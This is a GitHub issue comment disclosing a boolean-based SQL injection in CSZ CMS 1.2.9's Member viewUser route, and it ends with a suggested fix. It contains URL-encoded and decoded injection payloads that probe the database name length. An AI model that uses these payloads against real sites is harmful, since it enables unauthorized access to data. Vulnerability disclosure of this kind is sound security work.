### **[w4nd3r-hya](/w4nd3r-hya)** commented [Jan 14, 2022](#issue-1103315429)

| Hi, I found a front-end sql injection vulnerability in cszcms-1.2.9  The vulnerable code is on `cszcms\controllers\Member.php#viewUser`  The `$this->uri->segment(3)` parameter here can be controlled by the user  [image](https://user-images.githubusercontent.com/65856396/149486766-4872a527-7387-451b-86f2-6113fb41a3cd.png)  And no filtering leads to sql injection vulnerability  [image](https://user-images.githubusercontent.com/65856396/149486935-78ea5a49-7874-4b98-a1a6-de826c36388e.png)  First register a user in the foreground, then log in, then visit `/member/viewUser/%27%7c%7c%69%66%28%28%6c%65%6e%67%74%68%28%64%61%74%61%62%61%73%65%28%29%29%3e%31%29%2c%31%2c%30%29%23`  ``` %27%7c%7c%69%66%28%28%6c%65%6e%67%74%68%28%64%61%74%61%62%61%73%65%28%29%29%3e%31%29%2c%31%2c%30%29%23 => '||if((length(database())>1),1,0)#  ```  The content returned by the webpage is: [image](https://user-images.githubusercontent.com/65856396/149487143-245139fd-d289-4692-a28c-f287b7a6a93c.png)  visit `/member/viewUser/%27%7c%7c%69%66%28%28%6c%65%6e%67%74%68%28%64%61%74%61%62%61%73%65%28%29%29%3c%31%29%2c%31%2c%30%29%23`  ``` %27%7c%7c%69%66%28%28%6c%65%6e%67%74%68%28%64%61%74%61%62%61%73%65%28%29%29%3c%31%29%2c%31%2c%30%29%23 => '||if((length(database())<1),1,0)#  ```  The content returned by the webpage is: [image](https://user-images.githubusercontent.com/65856396/149487361-40cd0407-8888-48f0-95b4-835e1f771ed7.png)  It's a Boolean-based SQL injection  Suggest: Add a filter function to this parameter |
